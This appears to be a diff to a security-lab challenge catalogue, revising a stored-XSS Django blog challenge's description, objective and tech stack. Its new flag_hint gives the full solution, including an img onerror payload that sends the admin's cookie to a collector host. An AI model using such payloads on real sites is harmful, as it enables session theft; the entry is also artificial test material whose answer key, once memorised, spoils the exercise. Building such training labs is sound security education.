@@ -591,9 +591,9 @@
         "slug": "stored-xss-comment-plain",
         "title": "Stored XSS in Blog Comments",
         "difficulty": "apprentice",
-        "description": "A minimal Django blog stores comment bodies verbatim and renders them with the |safe filter. An administrator polls the moderation queue every 30 seconds to approve new comments and, in doing so, loads them fully rendered.",
-        "objective": "Post a comment whose payload exfiltrates the admin's csrftoken cookie value to http://collector:9000/report?t=<token>.",
-        "flag_hint": "The /solve endpoint on the app inspects the collector's request log via an internal socket; when the admin's currently-issued csrftoken value appears there, /solve returns the flag. The flag file /flag.txt is created inside the collector container the first time /solve succeeds.",
+        "description": "A minimal Django blog stores comment bodies verbatim and renders them on the admin moderation page with the |safe filter (Django autoescapes by default; |safe disables it). An admin bot loads the admin-only moderation queue every few seconds carrying its non-HttpOnly session cookie, so a stored payload runs in the admin's browser.",
+        "objective": "Post a comment whose stored payload runs when the admin bot moderates it and exfiltrates the admin's non-HttpOnly session cookie to http://collector:9000/report?c=<value>, then POST /solve.",
+        "flag_hint": "POST /comment {\"body\":\"<img src=x onerror=\\\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\\\">\"}; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}. /admin/moderate is admin-only (403 for you) — you never load it yourself.",
         "skills_taught": [
           "stored vs reflected XSS distinction",
           "identifying |safe / autoescape-off templates",
@@ -601,12 +601,11 @@
         ],
         "tech_stack": [
           "Python 3.12",
-          "Django 5.0",
+          "Django 5.2",
+          "gunicorn 23",
           "PostgreSQL 16",
-          "gunicorn 22",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "generic bulletin-board stored-XSS bug class seen in dozens of open-source CMS advisories"
       },
